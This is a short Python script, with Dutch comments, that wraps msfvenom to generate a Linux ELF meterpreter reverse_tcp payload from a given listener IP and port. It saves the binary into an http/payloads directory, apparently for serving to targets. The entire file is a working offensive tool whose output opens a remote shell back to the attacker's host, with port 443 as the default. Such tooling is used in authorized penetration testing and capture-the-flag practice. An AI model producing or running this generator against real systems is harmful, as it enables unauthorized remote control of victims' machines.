#!/usr/bin/python3

# Linux ELF generator
# Wrapper rond msfvenom voor Linux ELF binaries

from meuk.hacksec import *

parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP")
parser.add_argument("lport", help="listener port", nargs="?", default="443")
parser.add_argument("payload", help="msfvenom payload type", nargs="?", default="linux/x64/meterpreter/reverse_tcp")
parser.add_argument("bestand", help="output bestandsnaam (zonder extensie)", nargs="?", default="shell")
args = parser.parse_args()

output_path = f"http/payloads/{args.bestand}.elf"

print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating Linux ELF payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")

result = subprocess.run(
    ["msfvenom", "-p", args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}",
     "-f", "elf", "-o", output_path],
    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
)

if result.returncode != 0:
    print(f"{bcolors.BOLD}{bcolors.FAIL}[x] msfvenom stderr:{bcolors.ENDC}\n{result.stderr.decode('utf-8', errors='replace')}")
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful (rc={result.returncode}). Are you sure msfvenom is installed?{bcolors.ENDC}")

stdout_output = result.stdout.decode("utf-8", errors="replace").strip()
if stdout_output:
    print(stdout_output)

print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] ELF binary geschreven naar: {output_path}{bcolors.ENDC}")
